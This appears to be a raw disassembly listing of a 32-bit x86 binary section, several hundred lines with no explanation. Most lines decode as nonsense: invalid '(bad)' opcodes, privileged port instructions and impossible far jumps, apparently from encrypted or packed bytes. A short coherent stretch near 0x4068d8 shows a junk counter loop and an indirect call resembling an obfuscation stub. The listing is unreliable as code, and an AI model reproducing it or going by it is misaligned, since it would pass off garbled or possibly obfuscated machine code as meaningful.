  406719:	(bad)  
  40671b:	mov    ds:0x3a55806,eax
  406720:	cmp    BYTE PTR [edx-0x6beafd30],ah
  406726:	push   ecx
  406727:	stos   DWORD PTR es:[edi],eax
  406728:	out    dx,eax
  406729:	cld    
  40672a:	ret    0x855e
  40672d:	or     al,0x34
  40672f:	jae    0x406736
  406731:	call   0xecda727b
  406736:	dec    esi
  406737:	jge    0x4066f4
  406739:	imul   DWORD PTR [edi+eiz*4-0x7b]
  40673d:	push   ss
  40673e:	jle    0x40675c
  406740:	aas    
  406741:	xlat   BYTE PTR ds:[ebx]
  406742:	sub    eax,0x21
  406745:	test   al,0x47
  406747:	add    BYTE PTR [ebp+0x3f17eaad],0xa
  40674e:	cmp    al,dh
  406750:	icebp  
  406751:	push   0x41
  406753:	je     0x4067bd
  406755:	and    edx,DWORD PTR [ecx+0x1d]
  406758:	adc    bh,dh
  40675a:	pop    ebx
  40675b:	xchg   edi,eax
  40675c:	and    eax,0x12bb4b10
  406761:	or     edi,DWORD PTR [ebx+0x27]
  406764:	xchg   ecx,eax
  406765:	std    
  406766:	nop
  406767:	or     ah,BYTE PTR [edi-0x15]
  40676a:	in     eax,0xbc
  40676c:	cs std 
  40676e:	jecxz  0x40672b
  406770:	push   ebp
  406771:	add    al,0xde
  406773:	push   cs
  406774:	pop    ebx
  406775:	and    eax,0xd9f23930
  40677a:	push   ebp
  40677b:	bound  ebp,QWORD PTR [ecx]
  40677d:	loop   0x4067b9
  40677f:	imul   DWORD PTR [edx+0x4c3c28a2]
  406785:	mov    al,0xc1
  406787:	(bad)  
  406788:	push   cs
  406789:	fimul  DWORD PTR [ebx]
  40678b:	es ret 0x5cf
  40678f:	jle    0x40673e
  406791:	rcl    DWORD PTR [edi-0x739d3ee9],0x6a
  406798:	jnp    0x406759
  40679a:	push   esi
  40679b:	fs leave 
  40679d:	std    
  40679e:	jnp    0x40681b
  4067a0:	lods   al,BYTE PTR ds:[esi]
  4067a1:	mov    ebp,0xb520b2d7
  4067a6:	or     DWORD PTR [esi-0x6d0756f6],0xffffff96
  4067ad:	jne    0xb784402b
  4067b3:	stos   BYTE PTR es:[edi],al
  4067b4:	mov    eax,ds:0x41cf6174
  4067b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067ba:	mov    ah,bl
  4067bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067bd:	lds    edx,FWORD PTR [ebp+0x18]
  4067c0:	in     al,0x61
  4067c2:	cmp    al,0xb8
  4067c4:	in     al,dx
  4067c5:	pop    ebx
  4067c6:	cli    
  4067c7:	mov    al,0xf7
  4067c9:	xor    eax,0xfa5dff73
  4067ce:	pop    edi
  4067cf:	adc    al,0x86
  4067d1:	jp     0x40684b
  4067d3:	loope  0x4067c9
  4067d5:	push   edi
  4067d6:	mov    fs,WORD PTR [edi]
  4067d8:	call   0x494ea277
  4067dd:	xchg   edi,eax
  4067de:	mov    DWORD PTR [edi+0x33fa5fb6],ecx
  4067e4:	and    eax,0xa04abb59
  4067e9:	fst    DWORD PTR [ebx]
  4067eb:	cdq    
  4067ec:	or     BYTE PTR [esi+0x6ed9e1c8],al
  4067f2:	jle    0x4067f8
  4067f4:	sti    
  4067f5:	pop    ebp
  4067f6:	outs   dx,BYTE PTR ds:[esi]
  4067f7:	xor    al,0x87
  4067f9:	gs jnp 0x4067ce
  4067fc:	sub    al,0x74
  4067fe:	cmp    DWORD PTR [esi],0x77570267
  406804:	cmp    BYTE PTR [esi+0x10],dh
  406807:	std    
  406808:	inc    ecx
  406809:	in     al,dx
  40680a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40680b:	cmp    BYTE PTR [ecx],ch
  40680d:	mov    bh,0xe6
  40680f:	and    eax,DWORD PTR [edx-0x2184e447]
  406815:	push   0x1
  406817:	fst    DWORD PTR [eax-0x7402802f]
  40681d:	jo     0x40683c
  40681f:	jno    0x406866
  406821:	mov    ebp,edx
  406823:	sub    eax,0x804df754
  406828:	and    DWORD PTR [ebx],0x29462dff
  40682e:	stc    
  40682f:	test   DWORD PTR [ecx],ebp
  406831:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406832:	push   ss
  406833:	jg     0x40685f
  406835:	jmp    0x784b:0xc83a72f3
  40683c:	loopne 0x40684f
  40683e:	shl    DWORD PTR [edi],0xcd
  406841:	lods   al,BYTE PTR ds:[esi]
  406842:	push   0x416a6d4b
  406847:	ret    
  406848:	xchg   ebp,eax
  406849:	(bad)  
  40684a:	hlt    
  40684b:	add    bh,0x68
  40684e:	fdivr  DWORD PTR [eax-0x50]
  406851:	scas   al,BYTE PTR es:[edi]
  406852:	pop    edi
  406853:	add    eax,0x9dd822df
  406858:	sub    al,0xee
  40685a:	push   ss
  40685b:	mov    esp,0x75efd092
  406860:	iret   
  406861:	sahf   
  406862:	ret    0xaf78
  406865:	aam    0x65
  406867:	xor    ch,BYTE PTR [ebx-0x5af73884]
  40686d:	loope  0x406872
  40686f:	rcr    DWORD PTR [esi+0x309acedc],1
  406875:	xchg   BYTE PTR [ebp+0x67],bh
  406878:	scas   eax,DWORD PTR es:[edi]
  406879:	push   edx
  40687a:	outs   dx,BYTE PTR ds:[esi]
  40687b:	pop    edi
  40687c:	lea    eax,[edi+edx*8-0x4a]
  406880:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406881:	mov    ?,WORD PTR [ebp+edi*8-0x42]
  406885:	mov    esi,0x8386aae4
  40688a:	fbstp  TBYTE PTR [edi+0x6]
  40688d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40688e:	cli    
  40688f:	xchg   ebp,eax
  406890:	sbb    ebp,DWORD PTR [edi-0x5d]
  406893:	push   ds
  406894:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406895:	cmp    al,0xe8
  406897:	mul    edx
  406899:	ret    
  40689a:	push   cs
  40689b:	scas   al,BYTE PTR es:[edi]
  40689c:	inc    ebp
  40689d:	out    dx,al
  40689e:	sub    DWORD PTR [esi-0x5f],0x6
  4068a2:	and    dl,BYTE PTR [edx-0x21]
  4068a5:	ror    DWORD PTR [ecx-0x6c],0x66
  4068a9:	cmc    
  4068aa:	pop    edi
  4068ab:	fmul   QWORD PTR [edi]
  4068ad:	mov    ecx,0x435c029
  4068b2:	jle    0x4068f4
  4068b4:	inc    edx
  4068b5:	mov    ebx,es
  4068b7:	pop    ecx
  4068b8:	add    eax,0x52cf6e89
  4068bd:	les    ecx,FWORD PTR [eax+0x1e]
  4068c0:	lods   al,BYTE PTR ds:[esi]
  4068c1:	jge    0x406926
  4068c3:	addr16 xchg edx,eax
  4068c5:	jns    0x4068e5
  4068c7:	or     DWORD PTR [ebx-0x6db23d66],esp
  4068cd:	mov    cl,0xa2
  4068cf:	scas   al,BYTE PTR es:[edi]
  4068d0:	aad    0x76
  4068d2:	mov    ah,0xef
  4068d4:	pop    ebp
  4068d5:	ret    0x18
  4068d8:	push   ebp
  4068d9:	mov    ebp,esp
  4068db:	sub    esp,0x58
  4068de:	mov    DWORD PTR ds:0x42a7bd,0x1f
  4068e8:	cmp    DWORD PTR ds:0x42a7bd,0x0
  4068ef:	je     0x406947
  4068f5:	cmp    DWORD PTR ds:0x42a7bd,0x8
  4068fc:	jne    0x406916
  406902:	push   DWORD PTR [ebp-0x1c]
  406905:	push   DWORD PTR [ebp-0x24]
  406908:	push   0x42aaaa
  40690d:	push   DWORD PTR [ebp-0x10]
  406910:	call   DWORD PTR ds:0x41d18c
  406916:	cmp    DWORD PTR ds:0x42a7bd,0x9
  40691d:	jne    0x406931
  406923:	xor    eax,eax
  406925:	or     eax,DWORD PTR ds:0x42a7bd
  40692b:	dec    eax
  40692c:	mov    ds:0x42a7bd,eax
  406931:	mov    eax,ds:0x42a7bd
  406936:	dec    eax
  406937:	mov    ds:0x42a7bd,eax
  40693c:	jmp    0x4068e8
  406941:	and    DWORD PTR ds:0x42a769,edx
  406947:	mov    ecx,DWORD PTR [ebp+0x8]
  40694a:	jmp    0x406c53
  40694f:	int3   
  406950:	(bad)
  406953:	(bad)  
  406955:	fcmove st,st(1)
  406957:	in     eax,dx
  406958:	loop   0x406947
  40695a:	out    dx,eax
  40695b:	mov    al,ds:0x35e25d
  406960:	leave  
  406961:	js     0x4069db
  406963:	fs jle 0x4069de
  406966:	js     0x406963
  406968:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406969:	jmp    0x7825:0xc8205919
  406970:	pop    eax
  406971:	push   ebp
  406972:	xchg   edi,eax
  406973:	cld    
  406974:	mov    edx,0xceb283d8
  406979:	xor    DWORD PTR [ecx+0x7],edi
  40697c:	sbb    al,0x13
  40697f:	cld    
  406980:	pop    ss
  406981:	rol    BYTE PTR [eax],1
  406983:	rcr    ch,cl
  406985:	loop   0x40692d
  406987:	xor    eax,ebp
  406989:	shl    BYTE PTR [ebp+0xe4488e5],0xe1
  406990:	aam    0x6
  406992:	pop    esi
  406993:	not    ecx
  406995:	jg     0x4069b1
  406997:	fucomp st(1)
  406999:	push   edi
  40699b:	in     eax,dx
  40699c:	cld    
  40699d:	mov    al,ds:0xd1991c1d
  4069a2:	inc    eax
  4069a3:	cmp    eax,0x68342652
  4069a8:	bound  esp,QWORD PTR [ebx-0x5]
  4069ab:	xlat   BYTE PTR ds:[ebx]
  4069ac:	dec    esi
  4069ad:	push   es
  4069ae:	aaa    
  4069af:	sbb    al,BYTE PTR [esi]
  4069b1:	push   ebx
  4069b2:	mov    ds:0xf847207d,eax
  4069b7:	int3   
  4069b8:	pop    ecx
  4069b9:	or     ah,bh
  4069bb:	push   DWORD PTR [edi+ecx*1+0x17]
  4069bf:	int3   
  4069c0:	loopne 0x406945
  4069c2:	push   eax
  4069c3:	inc    ecx
  4069c4:	push   ebp
  4069c5:	gs ins BYTE PTR es:[edi],dx
  4069c7:	dec    esi
  4069c8:	inc    eax
  4069c9:	mov    esi,?
  4069cb:	pushf  
  4069cc:	scas   eax,DWORD PTR es:[edi]
  4069cd:	add    eax,0xc830a9c9
  4069d2:	fidiv  DWORD PTR [eax]
  4069d4:	fidivr DWORD PTR [edx+edi*4+0x728f7ec3]
  4069db:	add    dh,BYTE PTR [ebx+0x4d]
  4069de:	adc    eax,0x8b1d3290
  4069e3:	push   0x8ea03d1
  4069e8:	retf   0x4159
  4069eb:	jmp    DWORD PTR [ecx-0x70]
  4069ee:	loopne 0x4069ac
  4069f0:	mov    ebx,0x72b9fdff
  4069f5:	push   edx
  4069f6:	xor    bh,BYTE PTR [eax]
  4069f8:	jge    0x4069e1
  4069fa:	cmp    ebx,DWORD PTR [ebx+0x28]
  4069fd:	xor    BYTE PTR [ebx],ah
  4069ff:	jle    0x406a47
  406a01:	sub    DWORD PTR [edx+0x61],0x41
  406a05:	jmp    0x406a64
  406a07:	ret    
  406a08:	aas    
  406a09:	jl     0x4069b9
  406a0b:	add    ch,0x6b
  406a0e:	daa    
  406a0f:	jle    0x406a2e
  406a11:	xor    dl,BYTE PTR [esi+edx*4]
  406a14:	pop    esi
  406a15:	mov    ah,0x88
  406a17:	inc    ebp
  406a18:	cmc    
  406a19:	clc    
  406a1a:	and    edx,DWORD PTR [ecx+0x0]
  406a1d:	popa   
  406a1e:	jo     0x4069bb
  406a20:	out    0x8f,eax
  406a22:	loope  0x4069c4
  406a24:	xor    al,0x36
  406a26:	pushf  
  406a27:	out    0x33,al
  406a29:	popf   
  406a2a:	push   edi
  406a2b:	xor    edx,esp
  406a2d:	xchg   BYTE PTR [edi+0x56],ah
  406a30:	mov    bl,0x5e
  406a32:	ror    dl,1
  406a34:	add    ecx,DWORD PTR [eax+0x6f]
  406a37:	or     eax,0x59deb2e0
  406a3c:	dec    edx
  406a3d:	pop    ds
  406a3e:	sub    al,0xc4
  406a40:	les    edx,FWORD PTR [ebx+eiz*8-0x29]
  406a44:	or     BYTE PTR [ecx],0x5d
  406a47:	cmc    
  406a48:	pop    ds
  406a49:	push   ecx
  406a4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a4b:	mov    dh,0x96
  406a4d:	popa   
  406a4e:	cli    
  406a4f:	push   0x8ab88ec1
  406a54:	xchg   esp,eax
  406a55:	shl    BYTE PTR [ebx+0x7d],0x84
  406a59:	dec    esi
  406a5a:	cmp    eax,0xadd3f8ea
  406a5f:	or     eax,esp
  406a61:	bound  edx,QWORD PTR [edx]
  406a63:	mov    WORD PTR [eax+ebp*1+0x6a],gs
  406a67:	jae    0x406a47
  406a69:	xor    DWORD PTR [edi+0x3ebf46ba],ebp
  406a6f:	adc    BYTE PTR [edx-0x16],ch
  406a72:	fsub   QWORD PTR [ecx]
  406a74:	push   cs
  406a75:	add    DWORD PTR [edi-0x3fc353a5],esp
  406a7b:	inc    ecx
  406a7c:	loopne 0x406a61
  406a7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a7f:	mov    ebp,DWORD PTR [edx]
  406a81:	repnz sbb eax,esi
  406a84:	jl     0x406a8f
  406a86:	jg     0x406a9b
  406a88:	dec    esp
  406a89:	or     ah,BYTE PTR [edx-0x730a1de6]
  406a8f:	add    ecx,0x4a9866e
  406a95:	ins    DWORD PTR es:[edi],dx
  406a96:	repz mov bh,0x2d
  406a99:	mov    ch,0x2
  406a9b:	mov    ds:0xb9c12b67,al
  406aa0:	jnp    0x406a2a
  406aa2:	les    ebp,FWORD PTR [ecx]
  406aa4:	push   cs
  406aa5:	xlat   BYTE PTR fs:[ebx]
  406aa7:	sbb    dh,BYTE PTR [ecx+0x2e52a4b3]
  406aad:	ficom  DWORD PTR [ebx]
  406aaf:	mov    eax,ds:0xba2f990a
  406ab4:	xor    eax,0x3b53e366
  406ab9:	mov    ah,0xf5
  406abb:	push   ss
  406abc:	pusha  
  406abd:	cmp    al,0xf5
  406abf:	dec    ebp
  406ac0:	jnp    0x406a7f
  406ac2:	cmp    ecx,DWORD PTR [ebx]
  406ac4:	cli    
  406ac5:	(bad)  
  406ac6:	aad    0x25
  406ac8:	out    0xbf,al
  406aca:	dec    ebx
  406acb:	add    al,BYTE PTR [ebx]
  406acd:	call   0x6ed4fc5
  406ad2:	jnp    0x406a7d
  406ad4:	test   BYTE PTR [ecx+0x14f30fe7],dl
  406ada:	xchg   edi,eax
  406adb:	sub    al,0x17
  406add:	xacquire xchg BYTE PTR [eax],dl
  406ae0:	jmp    0x8cee:0x9b0c9fa5
  406ae7:	das    
  406ae8:	mov    edx,0xa3f2bbc
  406aed:	(bad)  
  406aee:	out    dx,eax
  406aef:	dec    esp
  406af0:	mov    esi,0x5b28d684
  406af5:	out    dx,eax
  406af6:	pop    esp
  406af7:	(bad)  
  406af9:	pop    edi
  406afa:	test   al,ch
  406afc:	outs   dx,BYTE PTR ds:[esi]
  406afd:	imul   eax,esi,0xdcc6d377
  406b03:	rcr    cl,1
  406b05:	retf   0x80b3
  406b08:	test   ebp,eax
  406b0a:	jle    0x406b7f
  406b0c:	and    eax,0x1801e111
  406b11:	add    DWORD PTR [ebx],edx
  406b13:	sub    ch,BYTE PTR [esi+0x3b]
  406b16:	or     cl,bh
  406b18:	ret    0xf105
  406b1b:	out    dx,al
  406b1c:	inc    ecx
  406b1d:	jecxz  0x406b66
  406b1f:	mov    ds:0x212611b4,al
  406b24:	sbb    bh,al
  406b26:	popa   
  406b27:	jno    0x406ad0
  406b29:	inc    esi
  406b2a:	mov    al,ds:0x77f770eb
  406b2f:	fimul  DWORD PTR [edi]
  406b31:	jp     0x406b10
  406b33:	dec    edi
  406b34:	xchg   edi,eax
  406b35:	xchg   ebp,eax
  406b36:	sbb    eax,0xac9e05e9
  406b3b:	add    edi,0xffffffc5
  406b3e:	xchg   DWORD PTR gs:[edi-0x5867b88],edi
  406b45:	pop    ds
  406b46:	add    cl,ch
  406b48:	pop    edx
  406b49:	push   esp
  406b4a:	xchg   ebp,eax
  406b4b:	das    
  406b4c:	mov    bh,0xf3
  406b4e:	fstp   st(5)
  406b50:	(bad)  
  406b51:	in     al,dx
  406b52:	leave  
  406b53:	mov    bh,0xdd
  406b55:	dec    edi
  406b56:	and    al,ch
  406b58:	pop    edx
  406b59:	or     DWORD PTR [ecx+0x17],0xdbf3c54c
  406b60:	mov    WORD PTR [ebp-0x37],ds
  406b63:	jno    0x406b06
  406b65:	sbb    al,0x1e
  406b67:	ror    BYTE PTR [eax],1
  406b69:	inc    ebp
  406b6a:	into   
  406b6b:	stos   DWORD PTR es:[edi],eax
  406b6c:	fsubr  st(1),st
  406b6e:	mov    ds:0xa0faadfe,al
  406b73:	retf   
  406b74:	add    al,0x69
  406b76:	loope  0x406bec
  406b78:	adc    cl,bh
  406b7a:	rcl    edi,1
  406b7c:	nop
  406b7d:	adc    BYTE PTR [edx],0x42
  406b80:	push   ebp
  406b81:	inc    edi
  406b82:	fwait
  406b83:	das    
  406b84:	pop    ebx
  406b85:	mov    al,ds:0xbdb95dbd
  406b8a:	pop    es
  406b8b:	lods   eax,DWORD PTR ds:[esi]
  406b8c:	jns    0x406bf2
  406b8e:	dec    esp
  406b8f:	adc    ch,ah
  406b91:	call   FWORD PTR [edx-0x31c71b3f]
  406b97:	jns    0x406bf0
  406b99:	hlt    
  406b9a:	sub    dh,bl
  406b9c:	aam    0x79
  406b9e:	pop    ebx
  406b9f:	jnp    0x406b77
  406ba1:	pusha  
  406ba2:	daa    
  406ba3:	fwait
  406ba4:	cmp    DWORD PTR [eax-0x16],0x51544794
  406bab:	(bad)
  406bae:	cli    
  406baf:	jnp    0x406b34
  406bb1:	pop    edx
  406bb2:	mov    dl,0x0
  406bb4:	ror    ah,1
  406bb6:	lahf   
  406bb7:	push   edx
  406bb8:	popa   
  406bb9:	retf   0x2349
  406bbc:	fbstp  TBYTE PTR [ebx+0x5d9e06f9]
  406bc2:	inc    esp
  406bc3:	stos   DWORD PTR es:[edi],eax
  406bc4:	xor    cl,BYTE PTR [ebp+0x13f207d]
  406bca:	mov    ds:0xfc9fc688,al
  406bcf:	es and eax,0x40b02e0f
  406bd5:	inc    esi
  406bd6:	stos   BYTE PTR es:[edi],al
  406bd7:	ja     0x406c3f
  406bd9:	sub    eax,0x93487605
  406bde:	push   edx
  406bdf:	popa   
  406be0:	popf   
  406be1:	lods   eax,DWORD PTR ds:[esi]
  406be2:	jno    0x406ba1
  406be4:	dec    ebx
  406be5:	icebp  
  406be6:	mov    dh,0xea
  406be8:	push   cs
  406be9:	pop    ds
  406bea:	and    ebx,edx
  406bec:	pop    esp
  406bed:	out    dx,al
  406bee:	dec    edi
  406bef:	ss or  dx,bx
  406bf3:	mov    esi,eax
  406bf5:	(bad)
  406bf8:	jmp    0xc9a8c76d
  406bfd:	and    eax,0x89ee4730
  406c02:	lods   eax,DWORD PTR ds:[esi]
  406c03:	xchg   DWORD PTR [esi],eax
  406c05:	push   eax
  406c06:	addr16 repz cwde 
  406c09:	lock je 0x406bc9
  406c0c:	cdq    
  406c0d:	push   ds
  406c0e:	les    edi,FWORD PTR [edx-0x65]
  406c11:	stos   BYTE PTR es:[edi],al
  406c12:	mov    ds:0x4f40adc7,al
  406c17:	icebp  
  406c18:	ret    
  406c19:	mov    dh,0x57
  406c1b:	setae  BYTE PTR [ecx]
  406c1e:	imul   ebx,DWORD PTR [ebp-0x73bc4667],0xffffffcc
  406c25:	fcmovnbe st,st(5)
  406c27:	jns    0x406c21
  406c29:	std    
  406c2a:	xor    DWORD PTR [ecx],edx
  406c2c:	or     ebx,DWORD PTR [esi]
  406c2e:	repnz nop
  406c30:	mov    ebx,0xc81cdd24
  406c35:	nop
  406c36:	das    
  406c37:	mov    dh,0x70
  406c39:	dec    esp
  406c3a:	ret    0xa13b
  406c3d:	or     edi,edi
  406c3f:	sub    BYTE PTR [ecx],dh
  406c41:	xor    eax,0x5a3e96bc
  406c46:	cmp    BYTE PTR [ecx+0x50],dl
  406c49:	rol    DWORD PTR [edx+0x75],0x77
  406c4d:	pop    esi
  406c4e:	sbb    DWORD PTR [ecx-0x4733fd4f],0x36
  406c55:	mov    al,BYTE PTR [eax]
  406c57:	add    BYTE PTR [ecx+0x42a7c915],al
  406c5d:	add    dl,ch
  406c5f:	dec    edi
  406c60:	add    BYTE PTR [eax],al
  406c62:	xor    ax,WORD PTR [ecx+0x20]
  406c66:	sub    DWORD PTR ds:0x42a7f5,0x417a
  406c70:	mov    ecx,0x3afc
  406c75:	xor    DWORD PTR ds:0x42a84d,0x2c9d
  406c7f:	jmp    0x406f88
  406c84:	rol    dh,cl
  406c86:	cmp    al,0xd3
  406c88:	aam    0xd9
  406c8a:	rol    ebp,1
  406c8c:	mov    eax,ebx
  406c8e:	and    DWORD PTR [ecx+0x27],ebx
  406c91:	jno    0x406c71
  406c93:	enter  0xcf6c,0x78
  406c97:	js     0x406cfd
  406c99:	jle    0x406d13
  406c9b:	js     0x406d18
  406c9d:	out    0xfb,al
  406c9f:	(bad)  
  406ca0:	sbb    ebx,edi
  406ca2:	pop    ss
  406ca3:	add    BYTE PTR [ebx],ah
  406ca5:	repnz mov ebx,DWORD PTR [edi]
  406ca8:	je     0x406ccb
  406caa:	jnp    0x406cf3
  406cac:	push   esi
  406cad:	pop    edx
  406cae:	xor    DWORD PTR [edx-0x2d3a7acb],edx
  406cb4:	or     ebp,DWORD PTR [ebx-0x20eb315e]
  406cba:	adc    eax,0x6fbf06cb
  406cbf:	js     0x406c87
  406cc1:	xchg   ebx,eax
  406cc2:	sub    dl,BYTE PTR [edx]
  406cc4:	adc    eax,0x1a0983bc
  406cc9:	push   edx
  406cca:	sbb    edx,ecx
  406ccc:	std    
  406ccd:	cmp    al,dl
  406ccf:	cs cld 
  406cd1:	aas    
  406cd2:	out    0xf3,al
  406cd4:	jb     0x406cb9
  406cd6:	cmc    
  406cd7:	pop    edi
  406cd8:	jns    0x406ccf
  406cda:	stos   BYTE PTR es:[edi],al
  406cdb:	pop    ebp
  406cdc:	je     0x406c70
  406cde:	mov    edx,0xdb7958f8
  406ce3:	xchg   BYTE PTR [bx],dl
  406ce6:	adc    ebp,esp
  406ce8:	and    eax,0x7c2fb774
  406ced:	pop    ss
  406cee:	into   
  406cef:	xchg   esi,eax
  406cf0:	nop
  406cf1:	ins    DWORD PTR es:[edi],dx
  406cf2:	dec    ebx
  406cf3:	dec    ebp
  406cf4:	jae    0x406d70
  406cf6:	adc    dl,BYTE PTR [esi+0x7d8db6bc]
  406cfc:	add    al,0xe3
  406cfe:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d00:	lds    ebp,FWORD PTR [esi-0x47e7180e]
  406d06:	jp     0x406d28
  406d08:	cmp    eax,0x6ecd7fb0
  406d0d:	fsubr  QWORD PTR [esi]
  406d0f:	jo     0x406ceb
  406d11:	and    al,0x79
  406d13:	jmp    0x53d5fb07
  406d18:	fs push esp
  406d1a:	jae    0x406d5b
  406d1c:	sub    esp,esp
  406d1e:	ror    bh,0x41
  406d21:	sub    al,0x18
  406d23:	fist   DWORD PTR es:[edx+ebx*8+0x3a]
  406d28:	lods   eax,DWORD PTR ds:[esi]
  406d29:	sbb    al,0xd7
  406d2b:	and    eax,0x8fef4dcc
  406d30:	jno    0x406d54
  406d32:	cmp    BYTE PTR [ecx-0x14],0xc7
  406d36:	ret    0xb983
  406d39:	cmp    dl,al
  406d3b:	jnp    0x406d38
  406d3d:	pop    esp
  406d3e:	addr16 push ebp
  406d40:	repz add al,0xee
  406d43:	mov    al,0x78
  406d45:	add    bh,bl
  406d47:	or     BYTE PTR es:[edi],dl
  406d4a:	gs push 0xffffff8c
  406d4d:	xor    ebp,DWORD PTR [ecx]
  406d4f:	adc    edx,DWORD PTR [esi]
  406d51:	bound  ebx,QWORD PTR [ecx+0x464d36e]
  406d57:	xchg   ebp,eax
  406d58:	xchg   ebx,eax
  406d59:	out    0x9e,al
  406d5b:	aam    0xdb
  406d5d:	add    dl,BYTE PTR [ecx]
  406d5f:	add    BYTE PTR [ecx+edx*1+0x752b6adc],bh
  406d66:	test   ebx,edx
  406d68:	mov    dh,0xef
  406d6a:	sbb    bl,dl
  406d6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d6d:	retf   
  406d6e:	fidivr WORD PTR [edi+0x2e301860]
  406d74:	inc    esp
  406d75:	jb     0x406d6c
  406d77:	hlt    
  406d78:	loop   0x406dc6
  406d7a:	pushf  
  406d7b:	push   esp
  406d7c:	dec    edx
  406d7d:	pop    edi
  406d7e:	jp     0x406d20
  406d80:	and    BYTE PTR [ebx+0x13],dh
  406d83:	and    al,0x78
  406d85:	xor    edx,0x1f741a18
  406d8b:	ror    DWORD PTR [edi-0x4f],1
  406d8e:	push   ebp
  406d8f:	jno    0x406dd1
  406d91:	add    BYTE PTR [edi+0x3],bl
  406d94:	sub    BYTE PTR [edx-0x44859565],dl
  406d9a:	into   
  406d9b:	pop    eax
  406d9c:	cmp    ecx,DWORD PTR [edi+0x38]
  406d9f:	push   edi
  406da0:	push   esi
  406da1:	out    0x2c,al
  406da3:	sub    esi,DWORD PTR [eax-0x37]
  406da6:	and    al,0x2c
  406da8:	int3   
  406da9:	in     al,0x86
  406dab:	xchg   ebx,eax
  406dac:	in     eax,dx
  406dad:	popa   
  406dae:	cwde   
  406daf:	push   esi
  406db0:	es xchg ebp,eax
  406db2:	sub    cl,BYTE PTR [eax]
  406db4:	push   esp
  406db5:	jne    0x406d9b
  406db7:	mov    BYTE PTR [ebx+edi*1+0x44],ah
  406dbb:	(bad)
  406dbf:	fs jmp 0x406e19
  406dc2:	xor    eax,0x2692882d
  406dc7:	stos   DWORD PTR es:[edi],eax
  406dc8:	clc    
  406dc9:	mov    ebx,0x31bcc400
  406dce:	test   eax,0x7c421e19
  406dd3:	pushf  
  406dd4:	pop    edx
  406dd5:	fisub  DWORD PTR [ebx]
  406dd7:	xchg   esp,eax
  406dd8:	je     0x406e14
  406dda:	mov    dh,0x7f
  406ddc:	or     BYTE PTR [ebp-0x3c1d840b],ch
  406de2:	fldenv [ecx]
  406de4:	ins    BYTE PTR es:[edi],dx
  406de5:	cmp    edx,esp
  406de7:	outs   dx,DWORD PTR ds:[esi]
  406de8:	neg    al
  406dea:	stc    
  406deb:	jns    0x406d87
  406ded:	lods   eax,DWORD PTR ds:[esi]
  406dee:	mov    DWORD PTR [edi],eax
  406df0:	push   DWORD PTR [edi]
  406df2:	cld    
  406df3:	pop    eax
  406df4:	and    edx,DWORD PTR [ebx-0x78167718]
  406dfa:	nop
  406dfb:	sbb    dh,BYTE PTR [edi+eax*8+0xbc4afb2]
  406e02:	inc    BYTE PTR [eax+0x1835496e]
  406e08:	sub    ebx,edi
  406e0a:	into   
  406e0b:	aam    0x8a
  406e0d:	mov    ebx,0xddf43adc
  406e12:	nop
  406e13:	dec    sp
  406e15:	js     0x406e31
  406e17:	ret    
  406e18:	mov    bh,0xf7
  406e1a:	loopne 0x406e68
  406e1c:	push   ss
  406e1d:	aas    
  406e1e:	cmp    BYTE PTR [ebp+0x54],0x3b
  406e22:	not    DWORD PTR [ebx+0x66]
  406e25:	repz (bad) 
  406e27:	sbb    BYTE PTR [ebp+0x3a2ad58c],ah
  406e2d:	(bad)  
  406e2e:	fidiv  WORD PTR ds:[ebx-0x276645d5]
  406e35:	popa   
  406e36:	jp     0x406dfd
  406e38:	jb     0x406e2d
  406e3a:	push   ds
  406e3b:	mov    ebp,0xb69f91ce
  406e40:	cld    
  406e41:	shl    BYTE PTR [ebx],1
  406e43:	iret   
  406e44:	int3   
  406e45:	in     eax,0x5f
  406e47:	inc    esi
  406e48:	inc    ebx
  406e49:	push   eax
  406e4a:	mov    ch,0x37
  406e4c:	inc    esp
  406e4d:	fcom   QWORD PTR [esi]
  406e4f:	test   BYTE PTR [ebp-0x7f],ch
  406e52:	mov    bl,0x5
  406e54:	test   BYTE PTR fs:[ecx-0x1108b97a],0xe0
  406e5c:	inc    ecx
  406e5d:	jbe    0x406e35
  406e5f:	pop    ebx
  406e60:	daa    
  406e61:	retf   
  406e62:	mov    eax,0x8ed02487
  406e67:	xor    BYTE PTR [esi+0x1f9613d5],bh
  406e6d:	dec    esi
  406e6e:	jne    0x406e6e
  406e70:	shr    DWORD PTR [edx+0x7153832b],cl
  406e76:	and    bl,BYTE PTR [edx+0x6c]
  406e79:	xor    DWORD PTR [ecx+edx*4-0x5815010b],ecx
  406e80:	sub    DWORD PTR [edx-0x61],ebx
  406e83:	jbe    0x406e21
  406e85:	mov    bl,0x6c
  406e87:	ins    BYTE PTR es:[edi],dx
  406e88:	lock imul ebp,DWORD PTR [ebx+edi*4],0x74
  406e8d:	adc    ch,0x27
  406e90:	clc    
  406e91:	or     edx,ecx
  406e93:	jnp    0x406e69
  406e95:	lds    edi,FWORD PTR [edx-0x36bde056]
  406e9b:	jbe    0x406e2d
  406e9d:	pushf  
  406e9e:	jmp    0x16005979
  406ea3:	das    
  406ea4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ea5:	scas   al,BYTE PTR es:[edi]
  406ea6:	sub    DWORD PTR [ebx-0x538eae04],edx
  406eac:	mov    bl,cl
  406eae:	mov    BYTE PTR [ecx+ebx*1+0x73],al
  406eb2:	jecxz  0x406eb3
  406eb4:	fadd   DWORD PTR [eax-0x7743562e]
  406eba:	add    bl,BYTE PTR ds:0x205dd270
  406ec0:	enter  0x29b8,0xf5
  406ec4:	sar    edx,1
  406ec6:	jl     0x406ea9
  406ec8:	and    ecx,eax
  406eca:	jg     0x406e55
  406ecc:	dec    eax
  406ecd:	dec    esp
  406ece:	gs inc esp
  406ed0:	int3   
  406ed1:	push   ss
  406ed2:	or     al,0x35
  406ed4:	inc    ebp
  406ed5:	or     eax,0xa1b6aa0b
